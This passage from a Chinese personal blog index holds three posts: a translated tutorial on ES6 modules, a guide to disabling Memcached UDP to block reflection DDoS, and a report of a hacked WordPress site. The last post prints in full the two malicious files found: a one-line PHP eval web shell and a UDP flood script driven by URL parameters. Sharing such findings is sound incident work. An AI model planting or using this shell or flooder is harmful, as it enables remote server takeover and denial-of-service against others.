class="line">...</span><br></pre></td></tr></table></figure><p>你可以<code>export</code>任何的顶级变量：<code>function</code>、<code>class</code>、<code>var</code>、<code>let</code>、<code>const</code>。</p><p>你如果要写一个模块知道这么多就够了！你不必再把所有的东西放到一个立即执行函数或者回调函数里面，只需要在你需要的地方进行声明。由于这个代码是一个模块，而不是一个脚本，所有的声明的作用域都只属于这个模块，而不是所有脚本和模块都能全局访问的。你只要把模块中的声明导出成一组公共模块的API就足够了。</p><p>除了导出，模块里的代码和其他普通代码没有什么区别。它可以访问全局变量，像<code>Object</code>和<code>Array</code>。如果你的模块在浏览器运行，还能够使用<code>document</code>和<code>XMLHttpRequest</code>。</p><p>在另一个文件中，我们可以导入并使用<code>detectCats()</code>函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// demo.js - Kittydar demo program</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123;detectCats&#125; <span class="keyword">from</span> <span class="string">"kittydar.js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> canvas = <span class="built_in">document</span>.getElementById(<span class="string">"catpix"</span>);</span><br><span class="line">    <span class="keyword">var</span> cats = detectCats(canvas);</span><br><span class="line">    drawRectangles(canvas, cats);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要从一个模块导入多个变量，你可以这样写：</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;detectCats, Kittydar&#125; <span class="keyword">from</span> <span class="string">"kittydar.js"</span>;</span><br></pre></td></tr></table></figure><p>当你运行一个包含<code>import</code>声明的模块，会先导入要导入的模块并加载，然后根据深度优先的原则遍历依赖图谱来执行对应模块，并跳过已经执行的模块，来避免循环。</p><p>这就是模块基础知识，这真的很简单。;-)</p><h2 id="导出列表"><a href="#导出列表" class="headerlink" title="导出列表"></a>导出列表</h2><p>你可以把你要导出的功能名写在一个列表里，然后用大括号括起来，这样就不用在每个要导出的功能前面加上export标记。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123;detectCats, Kittydar&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no `export` keyword required here</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">detectCats</span>(<span class="params">canvas, options</span>) </span>&#123; ... &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kittydar</span> </span>&#123; ... &#125;</span><br></pre></td></tr></table></figure><p>导出列表并不需要写在文件的第一行，它可以出现在模块文件的顶级作用域的任何位置。你可以有多个导出列表，或者将导出列表与导出声明混合使用，只要不重复导出同一个变量名就行。</p><h2 id="重命名导出和导入"><a href="#重命名导出和导入" class="headerlink" title="重命名导出和导入"></a>重命名导出和导入</h2><p>有时，导入的变量名碰巧与你需要使用的一些变量名冲突了，ES6允许你重命名导入的变量。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// suburbia.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Both these modules export something named `flip`.</span></span><br><span class="line"><span class="comment">// To import them both, we must rename at least one.</span></span><br><span class="line"><span class="keyword">import</span> &#123;flip <span class="keyword">as</span> flipOmelet&#125; <span class="keyword">from</span> <span class="string">"eggs.js"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;flip <span class="keyword">as</span> flipHouse&#125; <span class="keyword">from</span> <span class="string">"real-estate.js"</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>同样，你在导出变量的时候也可以重命名它们。这在你想使用不同名字导出相同功能的时候十分方便。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// unlicensed_nuclear_accelerator.js - media streaming without drm</span></span><br><span class="line"><span class="comment">// (not a real library, but maybe it should be)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">v1</span>(<span class="params"></span>) </span>&#123; ... &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">v2</span>(<span class="params"></span>) </span>&#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">  v1 <span class="keyword">as</span> streamV1,</span><br><span class="line">  v2 <span class="keyword">as</span> streamV2,</span><br><span class="line">  v2 <span class="keyword">as</span> streamLatestVersion</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="默认的导出"><a href="#默认的导出" class="headerlink" title="默认的导出"></a>默认的导出</h2><p>新的标准在设计上是兼容已经存在的CommonJS和AMD模块的。如果你有一个Node项目，并且你已经执行了<code>npm install lodash</code>。你使用ES6代码能够单独引入Lodash中的函数：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;each, map&#125; <span class="keyword">from</span> <span class="string">"lodash"</span>;</span><br><span class="line"></span><br><span class="line">each([<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>], <span class="function"><span class="params">x</span> =&gt;</span> <span class="built_in">console</span>.log(x));</span><br></pre></td></tr></table></figure><p>如果你已经习惯使用<code>_.each</code>而不是<code>each</code>，你依然想像以前一样使用它。或者， 你想把_当成一个函数来使用，因为这才是Lodash。</p><p>这种情况下，你只要稍微改变下你的写法：不使用花括号来导入模块。</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> _ <span class="keyword">from</span> <span class="string">"lodash"</span>;</span><br></pre></td></tr></table></figure><p>这个写法等同于<code>import {default as _} from &quot;lodash&quot;;</code>。所有的CommonJS 和AMD模块在ES6中都能被当作<code>default</code>导出，这个导出和你在CommonJS中使用<code>require()</code>导出得到东西一样，即<code>exports</code>对象。</p><p>ES6模块在设计上可以让你导出更多的东西，但对于现在的CommonJS模块，导出的default模块就是能导出的全部东西了。例如，在写这篇文章时，据我所知，著名的<a href="https://github.com/Marak/colors.js" target="_blank" rel="noopener">colors模块</a>没有特意去支持ES6语法，这是一个CommonJS模块组成的包，就像npm上的那些包一样，但是你可以直接引入到你的ES6代码中。</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> ES6 equivalent <span class="keyword">of</span> `<span class="javascript"><span class="keyword">var</span> colors = <span class="built_in">require</span>(<span class="string">"colors/safe"</span>);</span>`</span><br><span class="line"><span class="keyword">import</span> colors <span class="keyword">from</span> <span class="string">"colors/safe"</span>;</span><br></pre></td></tr></table></figure><p>如果你希望自己ES6模块也具有默认导出，这很简单。默认的导出方式并没有什么魔力；他就像其他导出一样，除了它的导出名为default。你可以使用我们之前提到的重命名语法：</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myObject = &#123;</span><br><span class="line">  field<span class="number">1</span>: <span class="keyword">value</span><span class="number">1</span>,</span><br><span class="line">  field<span class="number">2</span>: <span class="keyword">value</span><span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line">export &#123;myObject as <span class="keyword">default</span>&#125;;</span><br></pre></td></tr></table></figure><p>或者使用简写：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">export</span><span class="built_in"> default </span>&#123;</span><br><span class="line">  field1: value1,</span><br><span class="line">  field2: value2</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>export default</code>关键词后面可以跟任何值：一个函数、一个类、一个对象，所有能被命名的变量。</p><h2 id="模块对象"><a href="#模块对象" class="headerlink" title="模块对象"></a>模块对象</h2><p>不好意思，这篇文章有点长。JavaScript并不孤独：因为一些原因，所有的语言中都有模块系统，并且倾向于设计大量杂乱而又无聊的小特性。幸运的是我们只剩下一个话题，噢，不对，是两个。</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> cows <span class="keyword">from</span> <span class="string">"cows"</span>;</span><br></pre></td></tr></table></figure><p>当你使用<code>import *</code>的时候，被引入的是一个模块命名空间对象（module namespace object），它的属性是模块的输出。如果“cows”模块导出一个名为moo()的函数，那么在导入“cows”之后，你可以使用<code>cows.moo()</code>来进行调用。</p><h2 id="聚合模块"><a href="#聚合模块" class="headerlink" title="聚合模块"></a>聚合模块</h2><p>有时候一个包的主模块只不过是导入包其他所有的模块，并用统一的方式导出。为了简化这种代码，有一种将导入导出全部合一的简写：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> world-foods.js - good stuff <span class="keyword">from</span> all over</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> <span class="keyword">import</span> <span class="string">"sri-lanka"</span> <span class="keyword">and</span> re-<span class="keyword">export</span> some <span class="keyword">of</span> its exports</span><br><span class="line"><span class="keyword">export</span> &#123;Tea, Cinnamon&#125; <span class="keyword">from</span> <span class="string">"sri-lanka"</span>;</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> <span class="keyword">import</span> <span class="string">"equatorial-guinea"</span> <span class="keyword">and</span> re-<span class="keyword">export</span> some <span class="keyword">of</span> its exports</span><br><span class="line"><span class="keyword">export</span> &#123;Coffee, Cocoa&#125; <span class="keyword">from</span> <span class="string">"equatorial-guinea"</span>;</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> <span class="keyword">import</span> <span class="string">"singapore"</span> <span class="keyword">and</span> <span class="keyword">export</span> ALL <span class="keyword">of</span> its exports</span><br><span class="line"><span class="keyword">export</span> * <span class="keyword">from</span> <span class="string">"singapore"</span>;</span><br></pre></td></tr></table></figure><p>这种<code>export-from</code>表达式类似于<code>import-from</code>后面跟了一个export。这和真正的导入有一些区别，它不会在当前作用域中绑定将要导出的变量。如果你打算在<code>world-foods.js</code>中使用<code>Tea</code>来编写一些代码，请不要使用这种简写，你会发现Tea为定义。</p><p>如果“singapore”导出的命名与其他导出发生了冲突，那就会出现错误，所以请谨慎使用。</p><p>呼，我们已经把语法介绍完了！下面来谈谈一些有趣的事情。</p><h2 id="import到底做了什么？"><a href="#import到底做了什么？" class="headerlink" title="import到底做了什么？"></a><code>import</code>到底做了什么？</h2><p>不管你信不信，它什么都没做。</p><p>噢，你看起来没那么好骗。那么你会相信标准几乎没有说import到底该怎么做吗？这是件好事吗？（作者貌似很爱开玩笑。）</p><p>ES6将模块的加载细节<a href="http://www.ecma-international.org/ecma-262/6.0/index.html#sec-hostresolveimportedmodule" target="_blank" rel="noopener">完全交给了实现</a>，其余的模块执行部分却<a href="http://www.ecma-international.org/ecma-262/6.0/index.html#sec-toplevelmoduleevaluationjob" target="_blank" rel="noopener">规定得非常详细</a>。</p><p>简单来说，当你告诉JS引擎运行一个模块的时候，它的行为可以归纳为以下四部：</p><ol><li>解析：读取模块的源代码，并检查语法错误。</li><li>加载：加载所有的导入模块（递归进行），这是还未标准化的部分。</li><li>链接：对于每个新加载的模块，在实现上都会创建一个作用域，并把模块中声明的所有变量都绑定在这个作用域上，包括从其他模块导入的变量。如果你想试试<code>import {cake} from &quot;paleo&quot;</code>，但是“paleo”模块没真正导出名为cake的变量，你会得到一个错误。这很糟糕，因为你离运行js并品尝蛋糕只有一步之遥。</li><li>运行时间：最后，开始执行加载进来的新的模块中的代码。这时，整个import过程已经完成了，所以前面说代码执行到import这一行声明时，什么都没有发生。</li></ol><p>看到没？我说了什么都不会发生，在编程语言这件事上，我从来都不说慌。</p><p>现在我们可以开始介绍这个系统中有趣的部分了。这有一个非常炫酷的技巧。由于系统没有指定如何加载的这方面的细节，并且你可以通过查看源代码中导入的声明，提前计算出所有的依赖项，所以ES6的实现可以通过预处理器完成所有的工作，然后把所有的模块打包到一个文件中，最后通过网络进行请求一次即可。像webpack这样的工具就是这么做的。</p><p>这是一个优雅的解决方案，因为通过网络加载所有的脚本文件很耗时，假如你请求一个资源后，发现里面有import声明，然后你又得请求更多资源。一个加载器需要非常多的网络请求来回传输。通过webpack，你不仅能在今天就使用ES6的模块话，你还能获得很多好处，并且不需要担心会造成运行时的性能下降。</p><p>原本是有计划制定一个ES6中模块加载的详细规范的，并且已经初步成型。它没有成为标准的原因之一是不知道如何与打包这一特性进行整合。我希望模块化的加载会更加标准化，也希望打包工具会越来越好。</p><h2 id="静态-VS-动态，或者说：规则如何打破规则"><a href="#静态-VS-动态，或者说：规则如何打破规则" class="headerlink" title="静态 VS 动态，或者说：规则如何打破规则"></a>静态 VS 动态，或者说：规则如何打破规则</h2><p>作为一个动态编译语言，令人惊奇的是JavaScript拥有一个静态的模块系统。</p><ul><li>所有的<code>import</code>和<code>export</code>只能写在顶级作用域中。你不能在条件判断语句和函数作用域内使用import。</li><li>所有导出的变量名必须是显式的，你不能通过遍历一个数组，动态生成一组导出名进行导出。</li><li>模块对象都是被冻结的，不能通过polyfill为它添加新的特性。</li><li>在所有模块运行之前， 其依赖的模块都必须经过加载、解析、链接的过程，目前没有import懒加载相关的语法。（现在import()方法已经在提案中了）</li><li>对于import的错误，无法进行recovery。一个应用可能依赖许多的模块，一旦有一个模块加载失败，这个应用都不会运行。你不能在<code>try/catch</code>中使用<code>import</code>。正是因为es6的模块表现得如此静态，webpack才能在编译的时候检测出代码中的错误。</li><li>你没法为一个模块在加载所有依赖项之前添加钩子，这意味着一个模块没有办法控制其依赖项的加载方式。</li></ul><p>如果你的需求是静态的，ES6的模块系统还是相当不错的。但是你有时候你还是向进行一些hack，对吧？</p><p>这就是为什么你使用的模块加载系统会提供一些系统层次的API来配合ES6的静态的<code>import/export</code>语法。例如，webpack有一个API能进行代码的分割，按照你的需求对一些模块进行懒加载。这个API能够打破之前列出的规矩。</p><p>ES6的模块语法非常静态，这很好-在使用一些编译工具时我们都能尝到一些甜头。静态语法的设计可以让它与动态加载器丰富的API进行工作。</p><h2 id="我什么时候才能使用ES6模块？"><a href="#我什么时候才能使用ES6模块？" class="headerlink" title="我什么时候才能使用ES6模块？"></a>我什么时候才能使用ES6模块？</h2><p>如果你今天就想使用，你需要一个预编译器，如 <a href="https://github.com/google/traceur-compiler#what-is-traceur" target="_blank" rel="noopener">Traceur</a> 和 <a href="http://babeljs.io/" target="_blank" rel="noopener">Babel</a> 。这个系列之前也有相关文章，<a href="https://hacks.mozilla.org/2015/06/es6-in-depth-babel-and-broccoli/" target="_blank" rel="noopener">Gastón I. Silva：如何使用 Babel 和 Broccoli</a> 编译 ES6 代码为 web 可用。Gastón也将案例<a href="https://github.com/givanse/broccoli-babel-examples/tree/master/es6-modules" target="_blank" rel="noopener">放在了 GitHub 上</a>。另外<a href="http://2ality.com/2015/04/webpack-es6.html" target="_blank" rel="noopener">这篇文章</a>也介绍了如何使用 Babel 和 webpack。</p><p>ES6 模块系统由 Dave Herman 和 Sam Tobin-Hochstadt进行设计，他们不顾多人（包括我）的反对，多年来始终坚持模块系统是静态的。JonCoppeard正在Firefox上实现ES6的模块化功能。JavaScript Loader的相关标准的工作也正在进行中，预计在HTML中将会被添加类似<code>&lt;script type=module&gt;</code> 这样的东西。</p><p>这便是 ES6 了。</p><p>这太有趣了，我不希望现在就结束。也许我们还能再说一会。我们还能够讨论一些关于ES6规范中零零碎碎的东西，但这些又不足够写成文章。也行会有一些关于ES6未来特性的一些东西，尽请期待下周的<code>ES6 In Depth</code></p><p>原文链接：<a href="https://hacks.mozilla.org/2015/08/es6-in-depth-modules/" target="_blank" rel="noopener">ES6 In Depth: Modules</a></p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://www.love4026.org/316014/lnmp-fix-memcache-udp-reflection-ddos/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/316014/lnmp-fix-memcache-udp-reflection-ddos/" itemprop="url">LNMP修复Memcache UDP反射放大攻击</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-06T13:13:34+08:00">2018-03-06</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技术/" itemprop="url" rel="index"><span itemprop="name">技术</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">722</span></span></div></header><div class="post-body" itemprop="articleBody"><h2 id="关于Memcached系统"><a href="#关于Memcached系统" class="headerlink" title="关于Memcached系统"></a>关于Memcached系统</h2><p>Memcached是一个自由开源的，高性能，分布式内存对象缓存系统。Memcached是以LiveJournal旗下Danga Interactive公司的Brad Fitzpatric为首开发的一款软件。现在已成为mixi、hatena、Facebook、Vox、LiveJournal等众多服务中提高Web应用扩展性的重要因素。Memcached是一种基于内存的key-value存储，用来存储小块的任意数据（字符串、对象）。这些数据可以是数据库调用、API调用或者是页面渲染的结果。Memcached简洁而强大。它的简洁设计便于快速开发，减轻开发难度，解决了大数据量缓存的很多问题。它的API兼容大部分流行的开发语言。本质上，它是一个简洁的key-value存储系统。一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。</p><h2 id="关于分布式DDoS原理"><a href="#关于分布式DDoS原理" class="headerlink" title="关于分布式DDoS原理"></a>关于分布式DDoS原理</h2><p>分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。</p><h2 id="关于反射式DRDoS原理"><a href="#关于反射式DRDoS原理" class="headerlink" title="关于反射式DRDoS原理"></a>关于反射式DRDoS原理</h2><p>DRDoS是英文“Distributed Reflection Denial of Service ”的缩写，中文意思是“分布式反射拒绝服务”。与DoS、DDoS不同，该方式靠的是发送大量带有被害者IP地址的数据包给攻击主机，然后攻击主机对IP地址源做出大量回应，形成拒绝服务攻击。</p><h2 id="LNMP修复办法"><a href="#LNMP修复办法" class="headerlink" title="LNMP修复办法"></a>LNMP修复办法</h2><p>以下是lnmp一键安装脚本的修复方法</p><p>根据阿里的建议：</p><blockquote><p>如果您的Memcached版本低于1.5.6，且不需要监听UDP。您可以重新启动Memcached 加入 <code>-U 0</code>启动参数，例如：<code>Memcached -U 0</code>，禁止监听在udp协议上</p></blockquote><p><code>vi /etc/init.d/memcached</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start () &#123;</span><br><span class="line">    echo -n <span class="symbol">$</span><span class="string">"Starting $prog: "</span></span><br><span class="line">    memcached -d -p <span class="symbol">$</span>PORT -u <span class="symbol">$</span>USER -m <span class="symbol">$</span>CACHESIZE -c <span class="symbol">$</span>MAXCONN -P /var/run/memcached.pid <span class="symbol">$</span><span class="keyword">OPTIONS</span></span><br><span class="line">    RETVAL=<span class="symbol">$</span>?</span><br><span class="line">    echo</span><br><span class="line">    [ <span class="symbol">$</span>RETVAL -<span class="keyword">eq</span> <span class="number">0</span> ] &amp;&amp; touch /var/lock/subsys/memcached</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改为(启动项添加 <code>-U 0</code>)</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start () &#123;</span><br><span class="line">    echo -n <span class="symbol">$</span><span class="string">"Starting $prog: "</span></span><br><span class="line">    memcached -d -p <span class="symbol">$</span>PORT -u <span class="symbol">$</span>USER -m <span class="symbol">$</span>CACHESIZE -c <span class="symbol">$</span>MAXCONN -U <span class="number">0</span> -P /var/run/memcached.pid <span class="symbol">$</span><span class="keyword">OPTIONS</span></span><br><span class="line">    RETVAL=<span class="symbol">$</span>?</span><br><span class="line">    echo</span><br><span class="line">    [ <span class="symbol">$</span>RETVAL -<span class="keyword">eq</span> <span class="number">0</span> ] &amp;&amp; touch /var/lock/subsys/memcached</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://blog.csdn.net/microzone/article/details/79262549" target="_blank" rel="noopener">基于Memcached分布式系统DRDoS拒绝服务攻击技术研究</a><br><a href="https://paper.seebug.org/535/" target="_blank" rel="noopener">https://paper.seebug.org/535/</a></p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://www.love4026.org/316012/wordpress-hacked-by-php-script/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/316012/wordpress-hacked-by-php-script/" itemprop="url">wordpress被注入的PHP恶意脚本</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-05T10:10:37+08:00">2018-03-05</time></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">235</span></span></div></header><div class="post-body" itemprop="articleBody"><p>今天整理博客的图片资源，发现之前的Wordpress被人hacked。wp-content/ 图片文件夹下有两个php文件，应该是之前通过timthumb脚本漏洞注入的，一直没有发现。</p><p><code>1jh.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>Pacifism.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">999999</span>);</span><br><span class="line">$host = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port = $_GET[<span class="string">'port'</span>];</span><br><span class="line">$exec_time = $_GET[<span class="string">'time'</span>];</span><br><span class="line">$Sendlen = <span class="number">65535</span>;</span><br><span class="line">$packets = <span class="number">0</span>;</span><br><span class="line">ignore_user_abort(<span class="keyword">True</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (StrLen($host)==<span class="number">0</span> <span class="keyword">or</span> StrLen($port)==<span class="number">0</span> <span class="keyword">or</span> StrLen($exec_time)==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (StrLen($_GET[<span class="string">'rat'</span>])&lt;&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $_GET[<span class="string">'rat'</span>].$_SERVER[<span class="string">"HTTP_HOST"</span>].<span class="string">"|"</span>.GetHostByName($_SERVER[<span class="string">'SERVER_NAME'</span>]).<span class="string">"|"</span>.php_uname().<span class="string">"|"</span>.$_SERVER[<span class="string">'SERVER_SOFTWARE'</span>].$_GET[<span class="string">'rat'</span>];</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Warning to: opening"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$Sendlen;$i++)&#123;</span><br><span class="line">        $out .= <span class="string">"A"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$max_time = time()+$exec_time;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    $packets++;</span><br><span class="line">    <span class="keyword">if</span>(time() &gt; $max_time)&#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $fp = fsockopen(<span class="string">"udp://$host"</span>, $port, $errno, $errstr, <span class="number">5</span>);</span><br><span class="line">        <span class="keyword">if</span>($fp)&#123;</span><br><span class="line">            fwrite($fp, $out);</span><br><span class="line">            fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Send Host：$host:$port&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Send Flow：$packets * ($Sendlen/1024="</span> . round($Sendlen/<span class="number">1024</span>, <span class="number">2</span>) . <span class="string">")kb / 1024 = "</span> . round($packets*$Sendlen/<span class="number">1024</span>/<span class="number">1024</span>, <span class="number">2</span>) . <span class="string">" mb&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Send Rate："</span> . round($packets/$exec_time, <span class="number">2</span>) . <span class="string">" packs/s；"</span> . round($packets/$exec_time*$Sendlen/<span class="number">1024</span>/<span class="number">1024</span>, <span class="number">2</span>) . <span class="string">" mb/s"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://www.love4026.org/316010/how-to-insert-image-in-hexo-blog-post/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/316010/how-to-insert-image-in-hexo-blog-post/" itemprop="url">如何在hexo博客文章中插入图片</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span 